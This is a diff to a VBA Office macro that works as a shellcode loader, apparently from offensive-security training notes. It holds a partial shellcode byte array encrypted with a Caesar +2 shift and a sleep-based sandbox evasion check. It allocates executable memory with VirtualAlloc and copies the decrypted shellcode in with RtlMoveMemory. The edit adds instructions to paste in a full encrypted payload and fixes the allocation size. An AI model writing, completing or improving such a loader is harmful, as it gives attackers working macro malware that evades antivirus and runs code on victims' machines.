@@ -30,10 +30,14 @@ Function mymacro()
     Dim i As Long
     
     ' --- Encrypted shellcode (Caesar +2) ---
+    ' Generate with: vba-caesar-cipher-encryption.cs
+    ' Replace the entire Array(...) below with your full encrypted payload.
+    ' NOTE: The ... placeholder is NOT valid VBA — you MUST replace the entire array.
     buf = Array(254, 132, 2, 2, 2, 98, 139, 231, 51, 194, 102, _
                 141, 82, 50, 141, 84, 14, 141, 84, 22, 141, 116, _
-                42, 17, 185, 76, 40, 51, 1, 174, 62, 99, ...) 
-    ' (truncated for notes, full payload goes here)
+                42, 17, 185, 76, 40, 51, 1, 174, 62, 99)
+    ' TODO: paste your full Caesar+2 encrypted shellcode array here
+    ' Example format: buf = Array(byte1, byte2, byte3, ... byteN)
 
     ' --- Time-lapse Evasion (Sleep Check) ---
     Dim t1 As Date, t2 As Date, elapsed As Long
@@ -49,7 +53,7 @@ Function mymacro()
     Next i
 
     ' --- Allocate Memory & Copy Decrypted Shellcode ---
-    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+    addr = VirtualAlloc(0, UBound(buf) + 1, &H3000, &H40)
     For counter = LBound(buf) To UBound(buf)
         data = buf(counter)
         res = RtlMoveMemory(addr + counter, data, 1)
